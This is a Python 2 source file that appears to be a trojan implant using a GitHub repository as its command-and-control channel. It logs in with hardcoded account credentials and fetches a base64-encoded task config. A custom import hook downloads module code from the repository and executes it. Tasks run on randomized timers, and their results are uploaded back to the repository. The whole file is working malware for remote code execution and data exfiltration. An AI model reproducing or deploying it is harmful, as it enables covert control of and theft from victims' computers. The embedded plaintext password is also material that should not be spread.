import json, base64, sys, time, imp, random, threading, Queue, os

from github3 import login

para_id = 't1'

para_config = 'config/%s.json' % para_id
data_path = 'data/%s/' % para_id
modules = []
configured = False #?
task_queue = Queue.Queue()

def connect_to_github():
	gh = login(username='acidwolves', password='yCrust23')
	repo = gh.repository('acidwolves', 'cloudburst')
	branch = repo.branch('master')

	return gh, repo, branch

def get_file_contents(filepath):
	gh, repo, branch = connect_to_github()
	tree = branch.commit.commit.tree.recurse()
	for filename in tree.tree:
		if filepath in filename.path:
			print '[*] found file %s' % filepath
			blob = repo.blob(filename._json_data['sha'])
			return blob.content
	return None

def get_config():
	global configured
	config_json = get_file_contents(para_config)
	#print config_json
	config = json.loads(base64.b64decode(config_json))
	configured = True

	for task in config:
		if task['module'] not in sys.modules:
			exec('import %s' % task['module'])

	return config

def store_module_result(data, path=None):
	if not path: path = 'data/%s/%d.data' % (para_id, random.randint(1000,100000))
	gh, repo, branch = connect_to_github()
	repo.create_file(path, 'added data', data)
	return

class GitImporter(object):

	def __init__(self):
		self.current_module_code = ''

	def find_module(self, fullname, path=None):
		if configured:
			print '[*] Attempting to retrieve %s' % fullname
			new_library = get_file_contents('modules/%s' % fullname)

			if new_library is not None:
				self.current_module_code = base64.b64decode(new_library)
				return self

		return None

	def load_module(self, name):
		module = imp.new_module(name)
		exec self.current_module_code in module.__dict__
		sys.modules[name] = module
		return module

def module_runner(module):
	task_queue.put(1)
	result, path = sys.modules[module].run()
	task_queue.get()

	store_module_result(result, path)
	return

def loop_module_runner(module, lapse, stop_event):
	if int(lapse) <= 0: 
		module_runner(module)
	else:
		while not stop_event.is_set():
			module_runner(module)
			randomized_lapse = random.randint(int(lapse), int(lapse) + int(int(lapse)*0.2))
			stop_event.wait(randomized_lapse) # Similar to sleep but breaks on stop event set


# Main loop
sys.meta_path = [GitImporter()] # Here we assign our importer

launched_modules = {}

while 1:
	config = get_config()
	for task in config:
		if task['module'] not in launched_modules.keys():
			stop_event = threading.Event()
			thread = threading.Thread(target=loop_module_runner, args=(task['module'], task.get('lapse', '0'), stop_event))
			launched_modules[task['module']] = {'thread' : thread, 'stop_event' : stop_event}
			launched_modules[task['module']]['thread'].start()
	
	time.sleep(random.randint(60, 120)) # every 1-2 mins config file is scanned for new modules